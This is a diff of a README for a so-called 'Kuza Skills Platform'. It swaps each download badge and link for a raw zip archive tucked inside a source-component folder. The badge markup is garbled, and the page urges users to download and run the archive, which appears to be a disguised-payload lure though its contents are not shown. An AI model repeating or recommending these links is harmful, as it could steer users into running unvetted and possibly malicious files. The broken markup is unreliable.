@@ -1,6 +1,6 @@
 # 🎓 Kuza-Skills-Platform - Learn and Thrive in the Digital Economy
 
-[![Download Now](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/Skills_Platform_Kuza_2.2.zip%20Now-Get%20Your%https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/Skills_Platform_Kuza_2.2.zip)](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/Skills_Platform_Kuza_2.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/progress/Platform_Skills_Kuza_v1.5-beta.5.zip%20Now-Get%20Your%https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/progress/Platform_Skills_Kuza_v1.5-beta.5.zip)](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/progress/Platform_Skills_Kuza_v1.5-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Kuza Skills Platform! This guide will help you download and run t
 
 ## 📥 Download & Install
 
-To get the Kuza Skills Platform, visit this page to download: [Download the Kuza-Skills-Platform](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/Skills_Platform_Kuza_2.2.zip).
+To get the Kuza Skills Platform, visit this page to download: [Download the Kuza-Skills-Platform](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/progress/Platform_Skills_Kuza_v1.5-beta.5.zip).
 
 1. Go to the link above.
 2. Find the latest version listed on the page.
@@ -76,6 +76,6 @@ Your thoughts matter! We appreciate your feedback. Please share your experiences
 
 Be a part of our growing community! Follow us on social media and engage with other users to share knowledge and experiences.
 
-For updates, visit this page to download: [Download the Kuza-Skills-Platform](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/Skills_Platform_Kuza_2.2.zip).
+For updates, visit this page to download: [Download the Kuza-Skills-Platform](https://raw.githubusercontent.com/Davide0009/Kuza-Skills-Platform/main/src/components/progress/Platform_Skills_Kuza_v1.5-beta.5.zip).
 
 We hope you find the Kuza Skills Platform helpful in your digital learning journey!
